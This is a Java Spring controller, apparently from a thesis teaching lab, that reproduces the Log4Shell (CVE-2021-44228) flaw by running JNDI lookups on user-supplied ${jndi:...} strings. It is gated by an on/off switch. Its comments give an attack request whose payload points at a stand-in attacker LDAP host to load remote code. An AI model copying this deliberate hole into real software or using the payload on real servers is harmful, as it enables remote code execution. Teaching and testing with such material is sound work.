package com.thesis.carapace.vuln;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.util.HashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Log4Shell (CVE-2021-44228) 教学复现端点。
 *
 * 没有引入真实的 log4j-core 2.14.1（与 Spring Boot 4 的 log4j-api 内部 API
 * 二进制不兼容）。改为直接调用 JNDI API，精确复现 log4j 2.14.1 在
 * MessagePatternConverter / StrSubstitutor 中对 ${jndi:...} 的解析行为：
 *
 *   1. 扫描日志消息文本中的 ${jndi:URL} 占位符
 *   2. 用 InitialContext.lookup(URL) 发起 LDAP/RMI 远程对象解析
 *   3. JNDI 客户端从攻击者控制的 LDAP 服务器获取 Reference，从指向的
 *      HTTP 地址下载 .class 并实例化 → 执行 static 块
 *
 * 真实 log4j 漏洞链一致；区别仅在于这里不依赖 log4j-core 库。
 *
 * 开关 vuln.log4shell.enabled=false：仅回声字符串，不做任何 JNDI 操作。
 *
 * 攻击示例:
 *   POST /api/log4shell
 *   Content-Type: application/json
 *   {"message": "${jndi:ldap://attacker:1389/Exploit}"}
 */
@Slf4j
@RestController
@RequestMapping("/api/log4shell")
@RequiredArgsConstructor
public class Log4ShellController {

    /** 跟 log4j 2.14.1 StrSubstitutor 一致：匹配最外层 ${jndi:...}。 */
    private static final Pattern JNDI_LOOKUP = Pattern.compile("\\$\\{jndi:([^}]+)}");

    private final VulnSwitchRegistry vulnSwitches;

    @PostMapping
    public ResponseEntity<Map<String, Object>> log(@RequestBody Map<String, String> body) {
        String message = body.getOrDefault("message", "");
        boolean vuln = vulnSwitches.isEnabled(VulnSwitchRegistry.LOG4SHELL);

        Map<String, Object> result = new HashMap<>();
        result.put("logged", message);
        result.put("vulnerable", vuln);

        if (vuln) {
            String resolved = vulnerableJndiSubstitute("Received message: " + message);
            log.warn("[LOG4SHELL VULN] {}", resolved);
            result.put("resolved", resolved);
        } else {
            // 安全：参数化模板 + 不解析 ${} 表达式
            log.info("Received message: {}", message);
        }

        return ResponseEntity.ok(result);
    }

    /**
     * 复现 log4j 2.14.1 StrSubstitutor + JndiLookup 的核心行为。
     * 漏洞要点：用户输入字符串里的 ${jndi:...} 会被当作占位符 → JNDI 远程查询。
     */
    private static String vulnerableJndiSubstitute(String input) {
        Matcher m = JNDI_LOOKUP.matcher(input);
        StringBuilder sb = new StringBuilder();
        while (m.find()) {
            String jndiUrl = m.group(1);
            String replacement;
            try {
                Context ctx = new InitialContext();
                // INTENTIONALLY VULNERABLE: 直接对用户字段做 JNDI lookup。
                // ldap:// 会触发远程 Reference 解析 → 远程 .class 下载 → 实例化。
                Object obj = ctx.lookup(jndiUrl);
                replacement = (obj == null) ? "" : obj.toString();
            } catch (Throwable t) {
                // 即使查询/类加载失败，远程主机也能从 LDAP 请求落地这条记录
                replacement = "[" + t.getClass().getSimpleName() + "]";
            }
            m.appendReplacement(sb, Matcher.quoteReplacement(replacement));
        }
        m.appendTail(sb);
        return sb.toString();
    }
}
